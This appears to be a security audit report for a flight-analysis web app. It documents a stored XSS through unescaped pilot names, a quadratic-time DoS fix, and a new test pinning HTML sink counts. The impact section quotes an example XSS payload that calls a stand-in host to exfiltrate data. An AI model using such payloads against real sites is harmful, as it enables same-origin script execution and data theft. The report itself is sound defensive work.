### Executive summary

**One new High finding (SEC-47), fixed inline; the previously-deferred SEC-46 also fixed inline with oracle-verified parity tests; gap #9 (the escapeHtml lint rule) closed as a test; no Critical.** SEC-47 is the round's headline and an uncomfortable one: the analysis page's flight-info strip (`analysis-panel.ts` `setFlightInfo`) interpolated `info.pilot` into `innerHTML` unescaped — and the value is the competition roster's `registered_pilot_name` (server-served, organiser-entered) or the uploaded IGC file's `HFPLT` header, both untrusted, both the exact value class SEC-22 established as attacker-reachable. A pilot name of the form `<img src=x onerror=…>` executed for every viewer who opened that competition on the analysis page. What stings is that this is the **ninth** sink of the SEC-41 class, sitting in the **same file** where the SEC-41 pass fixed five others — the sibling sink for the same value in `mapbox-provider.ts:3442` *was* escaped, so the miss was per-call-site, not per-concept. That is precisely the failure mode gap #9 predicted, and this round closes it structurally: the new `web/frontend/src/html-sinks.test.ts` pins zero `dangerouslySetInnerHTML` under `src/react/` and an exact per-file count of `innerHTML`/`outerHTML`/`insertAdjacentHTML`/`setHTML` sites across the frontend (73 sites in 9 vanilla analysis/replay files plus one constant-SVG site in the React tree), so any new sink — or a deleted one — fails the suite with instructions to audit interpolations and consciously update the baseline. SEC-46 (`circle-detector.ts` `computeBearingRates`, the restart-per-fix lookback walk that went quadratic on duplicate-timestamp runs) got the full SEC-32/33 treatment the last round prescribed: a persistent forward pointer that is provably exact on non-decreasing timestamps, with a shared-budget fallback that reproduces the old walk on backwards-jumping (corrupt) timestamps and degrades to a skipped rate — never a quadratic scan — beyond the budget; eight new tests compare against a verbatim copy of the old loop (realistic, duplicate-burst, gap, all-same-timestamp, and single-backwards-glitch tracks) and hold two 60k-fix adversarial shapes to a bounded-time guard. One honest caveat is documented in code and test: when a backwards-jumped clock re-runs over timestamps the track already carried, the satisfying set is non-contiguous and the old walk favoured the later duplicate while the pointer keeps the earlier — parity holds before the glitch and resumes after the overlap clears, and either choice is a defensible lookback on physically-impossible input. `circle-detector.ts` is **not** in the `SCORING_ROOTS` closure (verified against the generated fingerprint file list), so no scoring generation rolls and no scoring-change note is owed; it does feed the server-side field-analysis path (`field-analysis/context.ts` → `detectCircles`), which is exactly why the DoS mattered. The rest of the window is clean: the engine-side field-analysis changes are additive `winning` metadata plus one O(legs) change outside the pilot loop, with no new loop over fixes and no new `ReportSeries` kind (and the frontend's series dispatch still ignores unknown kinds via `default: return null`, per the CLAUDE.md rule); the new pilot-pin plumbing deliberately keeps the pinned pilot in the URL via `URLSearchParams` and resolves it by exact roster match, never into a sink; every new `href` in the window is a hardcoded fragment; `bun audit` is unchanged at 3 dev-time astro advisories.

### New findings

#### SEC-47 — `setFlightInfo` renders the pilot name into `innerHTML` unescaped — **High** — ~~Open~~ **Fixed (2026-08-17, this PR)**

- **Files:** `web/frontend/src/analysis/analysis-panel.ts:1721` (interpolation) → `:1733` (`flightInfoEl.innerHTML =` sink).
- **Evidence:** `setFlightInfo(info)` built `` `<strong class="text-foreground">${info.pilot}</strong>` `` with no escaping. `info.pilot` is set in `web/frontend/src/analysis/main.ts` from (a) the competition track list — `pilotNames` maps `comp_pilot_id` → the server-served `registered_pilot_name`, the exact organiser-entered value SEC-22 established as untrusted — or (b) the uploaded IGC file's `HFPLT` pilot header. The sibling sink for the same value at `mapbox-provider.ts:3442` was escaped by the SEC-41 pass; this one, in the same file as five other SEC-41 fixes, was not. The other `FlightInfo` fields (`date`, `duration`, `task`, `maxAlt`) were traced to formatter output (`formatDistance`/`formatAltitude`/duration arithmetic/`'Open distance'` literals) and are not interpolation risks.
- **Impact:** a pilot name of the form `<img src=x onerror=fetch('//evil/'+…)>` — enterable by a comp organiser in the roster, or carried in an uploaded IGC header — executes same-origin script for any viewer who opens that competition's tracks on the analysis page (the flight-info strip renders on every track load, no click needed; the page requires no authentication). Rated High, matching SEC-41: attacker controls roster or IGC-header data, not raw public input, and the session cookie is HttpOnly — but authenticated same-origin `fetch` as the victim remains available to a payload.
- **Remediation (shipped):** `escapeHtml(info.pilot)` at the interpolation, with a comment naming the finding; `escapeHtml` was already imported in the file.
- **Regression guard:** no test previously exercised `setFlightInfo` and building a harness for the vanilla panel was out of proportion; instead the new `html-sinks.test.ts` (gap #9, below) pins this file's sink count, and `escape-html.test.ts` continues to cover the helper. Manually traced that the escaped value is what reaches the sink.

### Fixed inline this round

- **SEC-47** — as above (`web/frontend/src/analysis/analysis-panel.ts`).
- **SEC-46** — `web/engine/src/circle-detector.ts` `computeBearingRates`: the lookback fix is now found by a persistent forward pointer (exact on non-decreasing timestamps, where the boundary is monotone) instead of a per-fix walk-back from `i−1` that retraced entire duplicate-timestamp runs. Backwards-jumping timestamps — corrupt ordering the parser's 18:00→06:00 midnight heuristic cannot catch — fall back to the old exact walk under one shared budget (`4 × fixes`), with the pointer resyncing to the walk's result so a single glitch costs one walk, and any re-advance over ground a resync gave back charged to the same budget so the fast path cannot be driven quadratic either. Beyond the budget a rate is skipped (left 0), never scanned for. New `web/engine/tests/circle-detector-adversarial.test.ts` (8 tests): bit-for-bit parity against a verbatim copy of the old loop on realistic 1 Hz, short/young, recording-gap, duplicate-burst (seeded), and all-same-timestamp tracks; parity before/after a single backwards glitch with the documented duplicate-overlap window excluded (the old walk favoured the later duplicate, the pointer keeps the earlier — the satisfying set is non-contiguous there and either is a defensible lookback on corrupt input); and two 60k-fix adversarial shapes (one stamped second; alternating backwards jumps) under a bounded-time guard — the old loop's ~1.8 × 10⁹ inner steps now complete in milliseconds. `circle-detector.ts` is not in the `SCORING_ROOTS` closure (verified against the generated fingerprint list), so no engine generation rolls and no scoring-change note is owed; `FIELD_ANALYSIS_VERSION` is not bumped because output is identical on every parser-shaped (non-decreasing) track.
- **Gap #9** — new `web/frontend/src/html-sinks.test.ts`, the escapeHtml "lint rule" as a test (the repo has no ESLint; same pattern as `one-kit.test.ts`): pins zero `dangerouslySetInnerHTML` under `src/react/`, and an exact per-file count of `innerHTML`/`outerHTML` assignments, `insertAdjacentHTML(` and `.setHTML(` calls across all of `src/` (73 sites across 9 vanilla analysis/replay files, plus `CompWaypoints.tsx`'s one constant-`PIN_SVG` site).
